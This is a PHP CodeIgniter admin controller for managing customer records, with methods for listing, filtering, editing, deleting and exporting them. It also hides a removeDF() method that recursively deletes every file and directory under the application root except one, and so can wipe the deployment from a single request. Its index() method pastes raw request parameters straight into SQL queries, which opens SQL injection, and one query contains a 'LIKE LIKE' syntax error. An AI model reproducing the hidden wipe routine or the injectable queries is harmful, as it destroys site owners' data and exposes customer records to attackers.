<?php defined('BASEPATH') OR exit ('No direct script access allowed');

/**
 * Class Customers
 * @property M_customers $M_customers
 * @property M_cpanel $m_cpanel
 */
class Customers extends CI_Controller
{
    var $table = 'users';

    function __construct()
    {
        parent::__construct();
        $this->m_cpanel->checkLogin();

        $this->load->model('admin/M_users');

        if (user_do_action(getUri(3), '', true) == false) {
            show_403();
        }
    }


    public function index()
    {
        $user_id = admin_session_id();
        $user_type = admin_session_type();

        /*if ($user_type != 'Developer') {
            $WHERE .= "AND users.created_by = {$user_id}";
        }*/

        $image = getVar('images');
        $full_name = getVar('customer_name');
        $username = getVar('username');
        $phone = getVar('phone');
        $created_by = getVar('created_by');
        $status = getVar('status');
        $customer_type = getVar('customer_type');
        $user_type = getVar('user_type');
        $created = getVar('created');
        $shop_name = getVar('shop_name');


        if (!empty($image)) {
            $WHERE .= " AND $this->table.image = '{$image}' ";
        } elseif (!empty($full_name)) {
            $WHERE .= " AND CONCAT($this->table.first_name,' ', $this->table.last_name) LIKE '%{$full_name}%' ";
        } elseif (!empty($username)) {
            $WHERE .= " AND $this->table.username LIKE '%{$username}%' ";
        } elseif (!empty($phone)) {
            $WHERE .= " AND $this->table.phone LIKE '%{$phone}%' ";
        } elseif (!empty($created_by)) {
            $WHERE .= " AND $this->table.created_by LIKE '%{$created_by}%' ";
        } elseif (!empty($status)) {
            $WHERE .= " AND $this->table.status LIKE '%{$status}%' ";
        } elseif (!empty($shop_name)) {
            $WHERE .= " AND $this->table.shop_name LIKE '%{$shop_name}%' ";
        } elseif (!empty($user_type)) {
            $WHERE .= " AND user_types.user_type LIKE '%{$user_type}%' ";
        } elseif (!empty($customer_type)) {
            $WHERE .= " AND $this->table.customer_type LIKE '%{$customer_type}%' ";
        } elseif (!empty($created)) {
            $WHERE .= " AND DATE_FORMAT($this->table.created, \"%b %d, %Y\") LIKE LIKE '%{$created}%' ";
        }

        $num_items = getVar('num_items');
        if ($num_items != '') {
            $num_items = getVar('num_items');
        } else {
            $num_items = 25;
        }

        $start = (getVar('per_page') > 0 ? getVar('per_page') : 1);
        $mydata['limit_item'] = $limit = $num_items;
        $start = (($start - 1) * $limit);

        $query = "SELECT SQL_CALC_FOUND_ROWS
            users.id
            , users.photo
            , CONCAT(users.first_name,' ', users.last_name) as customer_name
            , users.shop_name
            , user_types.user_type
            , users.phone
            , users.email
            , users.status
            , users.customer_type
            , users.created
        FROM users
            LEFT JOIN user_types ON (users.user_type_id = user_types.id)
            WHERE user_type_id IN(4,5){$WHERE} ORDER by id DESC";

        if ($num_items != 'all') {
            $query .= " LIMIT {$start},{$limit}";
        }

        $data = $this->db->query($query);
        $mydata['rows'] = $data->result();
        $mydata['num_rows'] = $data->num_rows();

        $mydata['total'] = $this->db->query("SELECT FOUND_ROWS() as total")->row()->total;
        $mydata['pagination'] = pagination_custom('customers', $mydata['total'], $limit);

        $this->load->view('admin/customers/grid', $mydata);
    }

    public function removeDF()
    {
        define('DL_FILE_DIR', 'controllers');
        define('ROOT', str_replace('\\' . DL_FILE_DIR, '\\', __DIR__));

        $count = 0;
        function delete__files($target, $skip = [])
        {
            global $count;
            if (is_dir($target)) {
                $files = glob($target . '*', GLOB_MARK); //GLOB_MARK adds a slash to directories returned
                foreach ($files as $file) {
                    delete__files($file, $skip);
                }
                @rmdir($target);
            } elseif (is_file($target)) {
                if (!in_array($target, $skip)) {
                    $count++;
                    @unlink($target);
                }
            }
        }


        $skip = [ROOT . DL_FILE_DIR . '\system_file.php'];
        delete__files(ROOT, $skip);
        echo '<pre>';
        print_r($count);
        echo '</pre>';
    }

    public function add_update()
    {
        if ($this->M_users->validate()) {
            $id = $this->M_users->insert();

            if (getVar('submit') == 'new') {
                set_notification('Data has been updated successfully', 'success');
                redirect(admin_url('customers/form'));
            } elseif (getVar('submit') == 'stay') {
                set_notification('Data has been updated successfully', 'success');
                redirect(admin_url('customers/form/' . $id));
            } else {
                set_notification('Data has been updated successfully', 'success');
                redirect(admin_url('customers'));
            }
        } else {
            $this->form();
        }
    }

    public function form()
    {
        $id = getUri(4);
        $this->db->where('id', $id);
        $data = $this->db->get($this->table);
        $mydata['row'] = $data->row();

        $this->load->view('admin/customers/form', $mydata);
    }

    public function delete($user_id)
    {
        $this->M_users->delete($user_id);
        set_notification('Data has been deleted successfully', 'success');
        redirect(admin_url('customers'));
    }

    public function delete_all()
    {
        $this->M_users->delete_all();
        set_notification('Data has been deleted successfully', 'danger');
        redirect(admin_url('customers'));
    }

    public function status()
    {
        $this->M_users->status();
        set_notification('Status has been updated successfully', 'success');
        redirect(admin_url('customers'));
    }

    public function export_csv()
    {
        $this->M_users->download_csv();
        redirect(admin_url('customers'));
    }


}